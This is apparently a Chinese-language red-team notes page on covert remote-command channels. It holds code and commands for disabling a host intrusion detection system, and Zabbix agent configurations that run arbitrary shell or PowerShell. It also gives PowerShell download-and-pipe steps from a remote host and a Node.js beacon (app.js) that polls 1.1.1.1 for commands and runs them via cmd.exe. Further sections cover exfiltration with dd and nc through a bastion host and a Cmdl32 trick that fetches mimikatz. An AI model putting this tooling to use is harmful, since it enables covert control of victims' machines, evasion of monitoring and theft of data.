---
date: 2023-07-01
title: HCmd
author: [SecCMD]
description: >
  本页面聚焦于多种远HCmd管理方案
categories: 安全工具
tags:
  - 远程控制方案
---

# HCmd

- Node 程序远程调试
- 将PowerShell脚本转换为EXE
- 物联网协议 mqtt 远程命令通道

### 杀狼

```
操作：
1.先断开网络，使其不能和外部通信。
sudo ifconfig ethX dwon 关闭网卡
sudo /etc/init.d/networking stop 关闭网络

2.修改运行权限 或 移除hids目录
Mv hids
Chmod 000 hids

3.重新启动系统，hids环境被破坏失去能力。
```

### Process Stop 杀死进程

```
#include <stdio.h>
#include <signal.h>
#include <sys/reboot.h>

int main()
{
	kill(1887, 19);
	kill(1888, 19);
	kill(1890, 19);
	kill(1892, 19);
	kill(1894, 19);
	kill(1896, 19);

	int move_ok = 0;
	move_ok = rename("/opt/apps/soft", "/opt/apps/soft-backup");
	if (move_ok == 0)
	{
		sync();
		// reboot
		reboot(0X01234567);
	}

	return 0;
}
```

# Jenkins 方案

- Jenkins 里面很多工具，都是自动化的，应该可以用于远程。

[Jenkins](http://jenkins-ci.org/) continuous integration server.

# Zabbix 方案

```
# Version 5.0 LTS

# Server Test
http://1.1.1.1/zabbix/
Admin / zabbix

# Server install
apt install mysql-server
next step: https://www.zabbix.com/download?zabbix=5.0&os_distribution=ubuntu&os_version=18.04_bionic&db=mysql&ws=apache

# Server config
/etc/zabbix/zabbix_server.conf
ListenPort=8080

# Agent Download
https://www.zabbix.com/download_agents

# Agent install service
zabbix_agentd.exe -c zabbix_agentd.conf -i

# Agent cmd run
"C:\Users\Admin\Desktop\Age\zabbix_agentd.exe" -f --config "C:\Users\Admin\Desktop\Age\zabbix_agentd.conf"

# Agent config
#LogFile=C:\Users\Admin\Desktop\Age\zabbix_agentd.log
#Server=1.1.1.1
#Hostname=Win0
ServerActive=1.1.1.1:8080
LogType=system
StartAgents=0
UserParameter=exec[*],powershell.exe "$1"


# Link
https://toutiao.io/posts/twbhdk/preview
Zabbix agent on Microsoft Windows
https://www.zabbix.com/documentation/current/manual/appendix/install/windows_agent
User parameters
https://www.zabbix.com/documentation/current/manual/config/items/userparameters
Host item
https://www.zabbix.com/documentation/4.0/zh/manual/config/items/item
zabbix 5 自动注册功能

CVE-2020-11800 Zabbix远程代码执行漏洞
Zabbix 3.0.x~3.0.30
https://www.zabbix.com/cn/download?zabbix=3.0
https://xz.aliyun.com/t/8991


CVE
https://www.cvedetails.com/vulnerability-list/vendor_id-5667/Zabbix.html


Linux script
wget  https://cdn.zabbix.com/zabbix/binaries/stable/5.0/5.0.17/zabbix_agent-5.0.17-linux-3.0-amd64-static.tar.gz
tar xzvf zabbix_agent-5.0.17-linux-3.0-amd64-static.tar.gz
cat > conf/zabbix_agentd.conf <<'EOF'
ServerActive=1.1.1.1:8080
LogType=system
StartAgents=0
UserParameter=exec[*],/bin/sh -c "$1"
EOF
sudo -u nobody sbin/zabbix_agentd  -c conf/zabbix_agentd.conf

```



# Node.exe 方案

```

合法签名程序搞定~ NodeJS压缩后20MB，只有一个exe文件包含完整运行环境。
看看有没有实战价值，没有找到Nodejs开源的C2
例子如下（Powershell）：
wget -uri http://1.1.1.1/node.zip -outfile $env:USERPROFILE\Downloads\node.zip
Expand-Archive -Path $env:USERPROFILE\Downloads\node.zip -DestinationPath $env:USERPROFILE\Downloads\
cd $env:USERPROFILE\Downloads\; curl http://1.1.1.1/cmd.js | Select -ExpandProperty Content | .\node.exe

## todo 远程调试接口 作为后门
node inspect [options] [ script.js | host:port ] [arguments]
https://learnku.com/articles/21078
http://nodejs.cn/api/child_process.html

####### PC运行 ######
# 1. 下载node.exe app.js
wget -uri http://1.1.1.1/node.zip -outfile  $env:USERPROFILE\Downloads\node.zip
wget -uri http://1.1.1.1/app.js -outfile  $env:USERPROFILE\Downloads\app.js
wget -uri http://1.1.1.1/cmd.txt -outfile  $env:USERPROFILE\Downloads\cmd.txt

# 2. 解压文件
Expand-Archive -Path .\node.zip -DestinationPath $env:USERPROFILE\Downloads\

# 3. 创建服务 todo
add-service

# 4. 执行node.exe
$env:USERPROFILE\Downloads\node.exe app.js

合法签名程序搞定~ NodeJS压缩后20MB，只有一个exe文件包含完整运行环境。
看看有没有实战价值，没有找到Nodejs开源的C2
例子如下（Powershell）：
wget -uri http://1.1.1.1/node.zip -outfile $env:USERPROFILE\Downloads\node.zip
Expand-Archive -Path $env:USERPROFILE\Downloads\node.zip -DestinationPath $env:USERPROFILE\Downloads\
cd $env:USERPROFILE\Downloads\; curl http://1.1.1.1/cmd.js | Select -ExpandProperty Content | .\node.exe

App.js

var http = require('http');
const { spawn } = require('node:child_process');

function go_init() {
    // stuff you want to happen right away
    console.log('Welcome to My Console,');
}

function go_for() {
    // all the stuff you want to happen after that pause
	try{
		console.log('Blah blah blah blah extra-blah');
		go_get();
		setTimeout(go_for, 5000);
	}catch(e){
		// error captured
	}

}

function go_get() {
	var options = {
	  host: '1.1.1.1',
	  port: 80,
	  path: '/cmd.txt'
	};
    var body = '';
	http.get(options, function(res) {
      body = '';
	  res.on('data', function(chunk) {
		body += chunk;
	  });
	  res.on('end', function() {
		console.log(body);
		////////////////////////////////////
		go_cmd(body);
		//////////////////////////////////////	
	  });

	}).on('error', function(e) {
	  console.log("Got error: " + e.message);
	}); 
}

function go_cmd(str) {

	var bat = spawn('cmd.exe', ['/c', str]);

	bat.stdout.on('data', (data) => {
	  console.log(data.toString());
	});

	bat.stderr.on('data', (data) => {
	  console.error(data.toString());
	});

	bat.on('exit', (code) => {
	  console.log(`Child exited with code ${code}`);
	});

}

// call the first chunk of code right away
go_init();

// call the rest of the code and have it execute after 3 seconds
setTimeout(go_for, 3000);

```

### npm pkg

```
1. cd /var/log/nginx/

2. cat > package.json <<-EOF  
{
  "name": "webpack",
  "version": "1.0.0",
  "main": "index.js",
  "scripts": {
    "start": "echo 'test'",
    "stop": "npm pack && rm -rf package.json"
  }
}
EOF

3. sudo npm run start / stop

4. Download webpack-1.0.0.tgz
```

# Salt 方案

```
# Master Install
## Link: https://docs.saltproject.io/en/latest/topics/installation/index.html#quick-install
ssh ubuntu18.04
## Install Script https://github.com/saltstack/salt-bootstrap#install-using-curl
## -M  Also install salt-master  
## -N  Do not install salt-minion
curl -o bootstrap-salt.sh -L https://bootstrap.saltproject.io
sudo sh bootstrap-salt.sh -P stable 3003.3 -M -N
## Config SALT
## Link: https://docs.saltproject.io/en/latest/ref/configuration/index.html
interface: 0.0.0.0
publish_port: 4505
ret_port: 4506

## Run SALT
salt-master
systemctl start salt-master

# Win Client Install
## Link: https://repo.saltproject.io/#windows
https://mirrors.aliyun.com/saltstack/
wget Salt-Minion-3004-Py3-AMD64-Setup.exe
Salt-Minion-3004-Py3-AMD64-Setup.exe /S /master=8.130.162.66 /minion-name=sys0
## Config SALT
## Link: https://docs.saltproject.io/en/latest/ref/configuration/index.html
master: 10.0.0.1
publish_port: 4505
master_port: 4506

```



# Jumpserver 方案

```
方案一：编译定制版本netcat，代码中写死输入文件和输出IP
https://github.com/jiguangfuture/netcat

方案二：加密粘贴后，在解密文件
1. 事前准备数据传输脚本 test.py
#!/bin/bash
dd | gzip | base64 |nc 1.1.1.1 8080 

2. 加密并编码 这个脚本
gzip 密码 test.py ｜ base64

3. 通过堡垒机，拷贝base64文本，到目标系统，保存为test.py
#!/bin/bash
base64 ｜ gunzip 解密脚本（交互式输入密码）
sh test.py
```

### Cmdl32

```
参考：
- https://elliotonsecurity.com/living-off-the-land-reverse-engineering-methodology-plus-tips-and-tricks-cmdl32-case-study/

C：\Windows\System32\Cmdl32.exe”（由MS签名）

set tmp=%cd%
echo [connection Manager] > settings.txt
echo CMSFile=settings.txt >> settings.txt
echo ServiceNamem=WindowsUpdate >> settings.txt
echo TunnelFile=settings.txt >> settings.txt
echo [Settings] >> settings.txt
echo UpdateUr=https://stderr.pl/mimi/mimikatz.exe >> settings.txt

cmd132 /vpn /lan %cd%\settings.txt.

icacls %cd% /deny %username%:(OI)(CI)(DE,DC)
```